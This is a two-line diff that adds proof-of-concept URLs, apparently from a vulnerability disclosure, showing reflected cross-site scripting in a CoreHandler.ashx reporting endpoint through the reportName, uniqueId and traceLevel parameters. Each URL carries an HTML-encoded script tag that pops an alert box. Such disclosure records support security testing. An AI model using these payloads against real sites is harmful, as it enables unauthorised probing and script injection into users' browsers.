@@ -1,0 +1,2 @@
+http://www.example.com/CoreHandler.ashx?dd:script=CoreViewerInit.js&amp;reportName=&lt;script&gt;alert(&#039;XSS1!&#039;)&lt;/script&gt;&amp;uniqueId=&lt;script&gt;alert(&#039;XSS2!&#039;)&lt;/script&gt;#
+http://www.example.com/CoreHandler.ashx?dd:script=CoreController.js&amp;uniqueId=&lt;script&gt;alert(&#039;XSS1!&#039;)&lt;/script&gt;&amp;traceLevel=&lt;script&gt;alert(&#039;XSS2!&#039;)&lt;/script&gt;#
